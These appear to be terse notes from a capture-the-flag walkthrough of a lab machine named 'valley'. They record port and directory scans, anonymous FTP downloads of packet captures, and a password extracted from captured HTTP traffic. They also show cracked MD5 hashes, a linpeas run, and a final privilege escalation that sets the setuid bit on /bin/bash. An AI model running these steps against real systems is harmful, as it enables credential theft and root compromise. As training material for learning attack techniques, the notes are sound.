@@ -1,0 +1,73 @@
+nmap -sC -sV -oN nmap.log 10.49.191.135
+
+gobuster dir -u http://10.49.191.135:80 -w /usr/share/wordlists/dirb/big.txt -x php -t 50 | tee gobuster.log
+
+dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts
+
+
+-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
+
+mget *
+
+
+4	0.001227834	192.168.111.136	192.168.111.136	FTP	88	Response: 220 (vsFTPd 3.0.3)
+6	3.591118517	192.168.111.136	192.168.111.136	FTP	84	Request: USER anonymous
+8	3.591269528	192.168.111.136	192.168.111.136	FTP	102	Response: 331 Please specify the password.
+10	5.311666974	192.168.111.136	192.168.111.136	FTP	84	Request: PASS anonymous
+11	5.314430275	192.168.111.136	192.168.111.136	FTP	91	Response: 230 Login successful.
+13	5.314518562	192.168.111.136	192.168.111.136	FTP	74	Request: SYST
+14	5.314694017	192.168.111.136	192.168.111.136	FTP	87	Response: 215 UNIX Type: L8
+15	5.314855392	192.168.111.136	192.168.111.136	FTP	74	Request: FEAT
+16	5.314915487	192.168.111.136	192.168.111.136	FTP	83	Response: 211-Features:
+17	5.314924967	192.168.111.136	192.168.111.136	FTP	75	Response:  EPRT
+18	5.314930673	192.168.111.136	192.168.111.136	FTP	75	Response:  EPSV
+19	5.314936163	192.168.111.136	192.168.111.136	FTP	75	Response:  MDTM
+20	5.314941415	192.168.111.136	192.168.111.136	FTP	75	Response:  PASV
+21	5.314945537	192.168.111.136	192.168.111.136	FTP	82	Response:  REST STREAM
+
+
+
+2335	43.880057790	192.168.111.136	192.168.111.136	HTTP	605	POST /index.html HTTP/1.1  (application/x-www-form-urlencoded)
+
+2335	43.880057790	192.168.111.136	192.168.111.136	HTTP	605	POST /index.html HTTP/1.1  (application/x-www-form-urlencoded)
+Form item: "psw" = "ph0t0s1234"
+
+valleyDev@valley:/home$ file valleyAuthenticator 
+
+
+└─$ strings valleyAuthenticator
+UPX!
+
+└─$ upx -d valleyAuthenticator
+strings valleyAuthenticator | grep username
+
+
+└─$ strings valleyAuthenticator | grep -A 5 -B 5 username
+
+e6722920bab2326f8217e4bf6b1b58ac
+e6722920bab2326f8217e4bf6b1b58ac	md5	liberty123
+
+dd2921cc76ee3abfd2beb60709056cfb
+dd2921cc76ee3abfd2beb60709056cfb	md5	valley
+
+crackstation
+
+
+# 実行権限付与
+chmod +x linpeas.sh
+
+# 実行
+./linpeas.sh
+
+
+subprocess.run(['chmod','+s','/bin/bash'])
+import subprocess
+
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+bash -p
